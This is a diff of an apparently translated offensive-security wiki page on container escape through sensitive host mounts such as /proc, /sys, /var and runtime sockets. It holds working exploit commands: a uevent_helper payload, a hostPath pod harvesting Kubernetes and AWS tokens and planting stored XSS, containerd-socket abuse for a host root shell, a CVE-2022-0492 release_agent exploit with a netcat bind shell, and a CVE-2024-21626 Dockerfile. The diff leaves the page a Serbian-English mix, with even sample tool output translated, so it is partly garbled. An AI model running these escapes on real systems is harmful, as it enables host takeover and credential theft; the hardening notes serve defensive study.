@@ -15,8 +15,8 @@ Ovaj direktorijum omogućava pristup za modifikaciju kernel varijabli, obično p
 #### **`/proc/sys/kernel/core_pattern`**
 
 - Opisano u [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-- Ako možete da pišete unutar ove datoteke, moguće je napisati cevi `|` praćene putanjom do programa ili skripte koja će biti izvršena nakon što dođe do kvara.
-- Napadač može pronaći putanju unutar hosta do svog kontejnera izvršavajući `mount` i napisati putanju do binarne datoteke unutar svog kontejnerskog datotečnog sistema. Zatim, izazvati kvar programa kako bi naterao kernel da izvrši binarnu datoteku van kontejnera.
+- Ako možete da pišete unutar ove datoteke, moguće je napisati cev `|` praćenu putanjom do programa ili skripte koja će biti izvršena nakon što dođe do pada.
+- Napadač može pronaći putanju unutar hosta do svog kontejnera izvršavajući `mount` i napisati putanju do binarne datoteke unutar svog kontejnerskog fajl sistema. Zatim, srušiti program kako bi naterao kernel da izvrši binarnu datoteku van kontejnera.
 
 - **Primer testiranja i eksploatacije**:
 ```bash
@@ -49,18 +49,18 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Proveri pristup modprobe
 
 #### **`/proc/sys/vm/panic_on_oom`**
 
-- Referencirano u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Pominje se u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 - Globalna zastavica koja kontroliše da li kernel panici ili poziva OOM killer kada dođe do OOM uslova.
 
 #### **`/proc/sys/fs`**
 
-- Prema [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), sadrži opcije i informacije o datotečnom sistemu.
+- Prema [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), sadrži opcije i informacije o fajl sistemu.
 - Pristup za pisanje može omogućiti razne napade uskraćivanja usluge protiv hosta.
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
 - Omogućava registraciju interpretera za nenativne binarne formate na osnovu njihovog magičnog broja.
-- Može dovesti do eskalacije privilegija ili pristupa root shell-u ako je `/proc/sys/fs/binfmt_misc/register` zapisiv.
+- Može dovesti do eskalacije privilegija ili pristupa root shell-u ako je `/proc/sys/fs/binfmt_misc/register` moguće pisati.
 - Relevantna eksploatacija i objašnjenje:
 - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
 - Detaljan tutorijal: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
@@ -88,7 +88,7 @@ echo b > /proc/sysrq-trigger # Restartuje host
 
 #### **`/proc/kallsyms`**
 
-- Lista kernel eksportovane simbole i njihove adrese.
+- Lista kernel izvezene simbole i njihove adrese.
 - Osnovno za razvoj kernel eksploatacija, posebno za prevazilaženje KASLR-a.
 - Informacije o adresama su ograničene kada je `kptr_restrict` postavljen na `1` ili `2`.
 - Detalji u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
@@ -103,17 +103,17 @@ echo b > /proc/sysrq-trigger # Restartuje host
 
 - Predstavlja fizičku memoriju sistema u ELF core formatu.
 - Čitanje može otkriti sadržaj memorije host sistema i drugih kontejnera.
-- Velika veličina datoteke može dovesti do problema sa čitanjem ili rušenja softvera.
+- Velika veličina fajla može dovesti do problema sa čitanjem ili rušenja softvera.
 - Detaljna upotreba u [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
 
 #### **`/proc/kmem`**
 
-- Alternativni interfejs za `/dev/kmem`, predstavlja kernel virtuelnu memoriju.
+- Alternativni interfejs za `/dev/kmem`, koji predstavlja kernel virtuelnu memoriju.
 - Omogućava čitanje i pisanje, što omogućava direktnu modifikaciju kernel memorije.
 
 #### **`/proc/mem`**
 
-- Alternativni interfejs za `/dev/mem`, predstavlja fizičku memoriju.
+- Alternativni interfejs za `/dev/mem`, koji predstavlja fizičku memoriju.
 - Omogućava čitanje i pisanje, modifikacija sve memorije zahteva rešavanje virtuelnih do fizičkih adresa.
 
 #### **`/proc/sched_debug`**
@@ -123,89 +123,97 @@ echo b > /proc/sysrq-trigger # Restartuje host
 
 #### **`/proc/[pid]/mountinfo`**
 
-- Pruža informacije o tačkama montiranja u namespace-u montiranja procesa.
-- Izlaže lokaciju kontejnerskog `rootfs` ili slike.
+- Pruža informacije o tačkama montiranja u mount namespace-u procesa.
+- Izlaže lokaciju kontejnera `rootfs` ili slike.
 
 ### `/sys` Ranjivosti
 
 #### **`/sys/kernel/uevent_helper`**
 
 - Koristi se za rukovanje kernel uređajima `uevents`.
-- Pisanje u `/sys/kernel/uevent_helper` može izvršiti proizvoljne skripte prilikom `uevent` okidača.
-- **Primer za eksploataciju**: %%%bash
+- Pisanje u `/sys/kernel/uevent_helper` može izvršiti proizvoljne skripte prilikom aktiviranja `uevent`-a.
+- **Primer za eksploataciju**:
+```bash
 
-#### Kreira payload
+#### Creates a payload
 
 echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-#### Pronalazi putanju hosta iz OverlayFS montiranja za kontejner
+#### Finds host path from OverlayFS mount for container
 
 host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)
 
-#### Postavlja uevent_helper na maliciozni helper
+#### Sets uevent_helper to malicious helper
 
 echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
 
-#### Okida uevent
+#### Triggers a uevent
 
 echo change > /sys/class/mem/null/uevent
 
-#### Čita izlaz
+#### Reads the output
 
-cat /output %%%
+cat /output
+```
 
 #### **`/sys/class/thermal`**
 
-- Kontroliše postavke temperature, potencijalno uzrokujući DoS napade ili fizičku štetu.
+- Controls temperature settings, potentially causing DoS attacks or physical damage.
 
 #### **`/sys/kernel/vmcoreinfo`**
 
-- Curi adrese kernela, potencijalno kompromitujući KASLR.
+- Leaks kernel addresses, potentially compromising KASLR.
 
 #### **`/sys/kernel/security`**
 
-- Sadrži `securityfs` interfejs, omogućavajući konfiguraciju Linux Security Modules kao što je AppArmor.
-- Pristup može omogućiti kontejneru da onemogući svoj MAC sistem.
+- Houses `securityfs` interface, allowing configuration of Linux Security Modules like AppArmor.
+- Access might enable a container to disable its MAC system.
 
-#### **`/sys/firmware/efi/vars` i `/sys/firmware/efi/efivars`**
+#### **`/sys/firmware/efi/vars` and `/sys/firmware/efi/efivars`**
 
-- Izlaže interfejse za interakciju sa EFI varijablama u NVRAM-u.
-- Pogrešna konfiguracija ili eksploatacija može dovesti do "brick"-ovanih laptopova ili nebootabilnih host mašina.
+- Exposes interfaces for interacting with EFI variables in NVRAM.
+- Misconfiguration or exploitation can lead to bricked laptops or unbootable host machines.
 
 #### **`/sys/kernel/debug`**
 
-- `debugfs` nudi "bez pravila" interfejs za debagovanje kernela.
-- Istorija sigurnosnih problema zbog svoje neograničene prirode.
+- `debugfs` offers a "no rules" debugging interface to the kernel.
+- History of security issues due to its unrestricted nature.
 
-### `/var` Ranjivosti
+### `/var` Vulnerabilities
 
-Hostova **/var** fascikla sadrži socket-e kontejnerskog runtime-a i datotečne sisteme kontejnera. Ako je ova fascikla montirana unutar kontejnera, taj kontejner će dobiti pristup za čitanje i pisanje do datotečnih sistema drugih kontejnera sa root privilegijama. Ovo se može zloupotrebiti za prebacivanje između kontejnera, uzrokovanje uskraćivanja usluge ili postavljanje backdoor-a u druge kontejnere i aplikacije koje se u njima izvršavaju.
+The host's **/var** folder contains container runtime sockets and the containers' filesystems.
+If this folder is mounted inside a container, that container will get read-write access to other containers' file systems
+with root privileges. This can be abused to pivot between containers, to cause a denial of service, or to backdoor other
+containers and applications that run in them.
 
 #### Kubernetes
 
-Ako je kontejner poput ovog raspoređen sa Kubernetes:
+If a container like this is deployed with Kubernetes:
+
 ```yaml
-apiVersion: v1
-kind: Pod
-metadata:
-name: pod-mounts-var
-labels:
-app: pentest
-spec:
-containers:
-- name: pod-mounts-var-folder
-image: alpine
-volumeMounts:
-- mountPath: /host-var
-name: noderoot
-command: [ "/bin/sh", "-c", "--" ]
-args: [ "while true; do sleep 30; done;" ]
-volumes:
-- name: noderoot
-hostPath:
-path: /var
+apiVersion: v1  
+kind: Pod  
+metadata:  
+  name: pod-mounts-var  
+  labels:  
+    app: pentest  
+spec:  
+  containers:  
+    - name: pod-mounts-var-folder  
+      image: alpine  
+      volumeMounts:  
+        - mountPath: /host-var  
+          name: noderoot  
+      command: [ "/bin/sh", "-c", "--" ]  
+      args: [ "while true; do sleep 30; done;" ]  
+  volumes:  
+    - name: noderoot  
+      hostPath:  
+        path: /var
 ```
-Unutar **pod-mounts-var-folder** kontejnera:
+
+Inside the **pod-mounts-var-folder** container:
+
 ```bash
 / # find /host-var/ -type f -iname '*.env*' 2>/dev/null
 
@@ -223,20 +231,22 @@ REFRESH_TOKEN_SECRET=14<SNIP>ea
 /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
 /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html
 
-/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
-are/nginx/html/index2.html
+/ # echo '<!DOCTYPE html><html lang="sr"><head><script>alert("Skladišteni XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index2.html
 ```
-XSS je postignut:
+
+The XSS was achieved:
 
 ![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)
 
-Napomena: kontejner NE zahteva restart ili bilo šta drugo. Sve promene napravljene putem montiranog **/var** foldera biće primenjene odmah.
+Note that the container DOES NOT require a restart or anything. Any changes made via the mounted **/var** folder will be applied instantly.
 
-Takođe možete zameniti konfiguracione datoteke, binarne datoteke, servise, datoteke aplikacija i shell profile kako biste postigli automatski (ili poluautomatski) RCE.
+You can also replace configuration files, binaries, services, application files, and shell profiles to achieve automatic (or semi-automatic) RCE.
 
-##### Pristup cloud kredencijalima
+##### Access to cloud credentials
 
-Kontejner može čitati K8s serviceaccount tokene ili AWS webidentity tokene što omogućava kontejneru da dobije neovlašćen pristup K8s ili cloud:
+The container can read K8s serviceaccount tokens or AWS webidentity tokens
+which allows the container to gain unauthorized access to K8s or cloud:
+
 ```bash
 / # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
 /host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
@@ -245,33 +255,102 @@ Kontejner može čitati K8s serviceaccount tokene ili AWS webidentity tokene št
 /host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
 /host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
 ```
+
 #### Docker
 
-Eksploatacija u Dockeru (ili u Docker Compose implementacijama) je potpuno ista, osim što su obično datoteke drugih kontejnera dostupne pod drugačijom osnovnom putanjom:
+The exploitation in Docker (or in Docker Compose deployments) is exactly the same, except that usually
+the other containers' filesystems are available under a different base path:
+
 ```bash
 $ docker info | grep -i 'docker root\|storage driver'
-Storage Driver: overlay2
+Skladišni drajver: overlay2
 Docker Root Dir: /var/lib/docker
 ```
-Dakle, fajl sistemi su pod `/var/lib/docker/overlay2/`:
+
+So the filesystems are under `/var/lib/docker/overlay2/`:
+
 ```bash
 $ sudo ls -la /var/lib/docker/overlay2
 
-drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
-drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
-drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
-drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
+drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d  
+drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496  
+drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f  
+drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2  
 <SNIP>
 ```
-#### Napomena
 
-Stvarne putanje mogu se razlikovati u različitim postavkama, zbog čega je najbolje da koristite **find** komandu da
-pronađete datoteke drugih kontejnera i SA / web identitet tokene.
+#### Note
 
-### Reference
+The actual paths may differ in different setups, which is why your best bet is to use the **find** command to
+locate the other containers' filesystems and SA / web identity tokens
 
+
+
+### Other Sensitive Host Sockets and Directories (2023-2025)
+
+Mounting certain host Unix sockets or writable pseudo-filesystems is equivalent to giving the container full root on the node. **Treat the following paths as highly sensitive and never expose them to untrusted workloads**:
+
+```text
+/run/containerd/containerd.sock     # containerd CRI soket  
+/var/run/crio/crio.sock             # CRI-O runtime soket  
+/run/podman/podman.sock             # Podman API (rootful ili rootless)  
+/var/run/kubelet.sock               # Kubelet API na Kubernetes čvorovima  
+/run/firecracker-containerd.sock    # Kata / Firecracker
+```
+
+Attack example abusing a mounted **containerd** socket:
+
+```bash
+# unutar kontejnera (soket je montiran na /host/run/containerd.sock)
+ctr --address /host/run/containerd.sock images pull docker.io/library/busybox:latest
+ctr --address /host/run/containerd.sock run --tty --privileged --mount \
+type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
+chroot /host /bin/bash   # pun root shell na hostu
+```
+
+A similar technique works with **crictl**, **podman** or the **kubelet** API once their respective sockets are exposed.
+
+Writable **cgroup v1** mounts are also dangerous. If `/sys/fs/cgroup` is bind-mounted **rw** and the host kernel is vulnerable to **CVE-2022-0492**, an attacker can set a malicious `release_agent` and execute arbitrary code in the *initial* namespace:
+
+```bash
+# pretpostavljajući da kontejner ima CAP_SYS_ADMIN i ranjivu jezgru
+mkdir -p /tmp/x && echo 1 > /tmp/x/notify_on_release
+
+echo '/tmp/pwn' > /sys/fs/cgroup/release_agent   # zahteva CVE-2022-0492
+
+echo -e '#!/bin/sh\nnc -lp 4444 -e /bin/sh' > /tmp/pwn && chmod +x /tmp/pwn
+sh -c "echo 0 > /tmp/x/cgroup.procs"  # pokreće događaj praznog cgrupa
+```
+
+When the last process leaves the cgroup, `/tmp/pwn` runs **as root on the host**. Patched kernels (>5.8 with commit `32a0db39f30d`) validate the writer’s capabilities and block this abuse.
+
+### Mount-Related Escape CVEs (2023-2025)
+
+* **CVE-2024-21626 – runc “Leaky Vessels” file-descriptor leak**
+runc ≤1.1.11 leaked an open directory file descriptor that could point to the host root. A malicious image or `docker exec` could start a container whose *working directory* is already on the host filesystem, enabling arbitrary file read/write and privilege escalation. Fixed in runc 1.1.12 (Docker ≥25.0.3, containerd ≥1.7.14).
+
+```Dockerfile
+FROM scratch
+WORKDIR /proc/self/fd/4   # 4 == "/" on the host leaked by the runtime
+CMD ["/bin/sh"]
+```
+
+* **CVE-2024-23651 / 23653 – BuildKit OverlayFS copy-up TOCTOU**
+A race condition in the BuildKit snapshotter let an attacker replace a file that was about to be *copy-up* into the container’s rootfs with a symlink to an arbitrary path on the host, gaining write access outside the build context. Fixed in BuildKit v0.12.5 / Buildx 0.12.0. Exploitation requires an untrusted `docker build` on a vulnerable daemon.
+
+### Hardening Reminders (2025)
+
+1. Bind-mount host paths **read-only** whenever possible and add `nosuid,nodev,noexec` mount options.
+2. Prefer dedicated side-car proxies or rootless clients instead of exposing the runtime socket directly.
+3. Keep the container runtime up-to-date (runc ≥1.1.12, BuildKit ≥0.12.5, containerd ≥1.7.14).
+4. In Kubernetes, use `securityContext.readOnlyRootFilesystem: true`, the *restricted* PodSecurity profile and avoid `hostPath` volumes pointing to the paths listed above.
+
+### References
+
+- [runc CVE-2024-21626 advisory](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv)
+- [Unit 42 analysis of CVE-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)
 - [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
-- [Razumevanje i učvršćivanje Linux kontejnera](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
-- [Zloupotreba privilegovanih i neprivilegovanih Linux kontejnera](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)
+- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
+- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)
 
 {{#include ../../../../banners/hacktricks-training.md}}
